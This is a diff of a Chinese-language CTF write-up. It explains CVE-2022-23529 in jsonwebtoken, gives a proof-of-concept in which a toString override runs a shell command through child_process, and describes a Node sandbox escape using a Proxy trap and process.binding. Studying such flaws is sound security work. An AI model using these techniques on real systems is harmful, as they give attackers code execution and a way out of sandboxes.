@@ -12,7 +12,7 @@ tags:
 题目背景是 [CVE-2022-23529](https://cve.report/CVE-2022-23529)。在 `jsonwebtoken < 9.0.0` 中，对于`jwt.verify` 的 `secretOrPublicKey` 参数如果能够控制那么可以覆写其 toString 方法达成恶意利用。其漏洞点在于：
 ```js
 if (!options.algorithms) { // undefined
-  options.algorithms = ~secretOrPublicKey.toString().indexOf('BEGIN CERTIFICATE') ||
+  options.algorithms = ~secretOrPublicKey.toString().indexOf('BEGIN CERTIFICATE') || 
 	~secretOrPublicKey.toString().indexOf('BEGIN PUBLIC KEY') ? PUB_KEY_ALGS :
 	~secretOrPublicKey.toString().indexOf('BEGIN RSA PUBLIC KEY') ? RSA_KEY_ALGS : HS_ALGS;
 }
@@ -21,10 +21,11 @@ CVE Payload：
 ```js
 const jwt = require('jsonwebtoken');  // version < 9.0.0
 token = jwt.sign({},"foo");
-obj = { toString : ()=> {
-        console.log(require('child_process').execSync("whoami").toString());  
-        process.exit(0)  
-    }
+obj = { 
+  toString : ()=> {
+    console.log(require('child_process').execSync("whoami").toString());  
+    process.exit(0)  
+  }
 };
 jwt.verify(token,obj);
 ```
@@ -48,7 +49,7 @@ jwt.verify(token,obj);
 
 再来看看题目：题目中的 `Object.create(null)` 让我们不能直接用 `this` 获取沙箱外的对象；strict mode 使我们不能够使用 `arguments.callee.caller` 拿函数的调用者，所以唯一的想法是构造 Proxy。在 Proxy 对象中有很多代理方法，但是需要找到一个代理方法的函数参数是引用传递。
 
-可以看到在 `Proxy#apply` 的参数中有一个 `argArray` 数组引用类型，符合利用要求；除此之外还有 `construct` 的 `argumentsList` 也是引用数组。能够找到一个 `[Symbol.toPrimitive]` 方法满足调用 apply 的条件，而该方法会在模板字符串中触发。
+可以看到在 `Proxy#apply` 的参数中有一个 `argArray` 数组引用类型，符合利用要求；除此之外还有 `construct` 的 `argumentsList` 也是引用数组。能够找到一个 `[Symbol.toPrimitive]` 方法满足调用 apply 的条件，而该方法可以在模板字符串中触发。
 
 另一个绕过点在于 `process.mainModule = null`，无法通过此拿到 module，但是可以通过 `process.binding` 拿到 Internal Binding，即内建的 CPP 模块。`process.moduleLoadList` 列出了所有 module 和 binding。
 
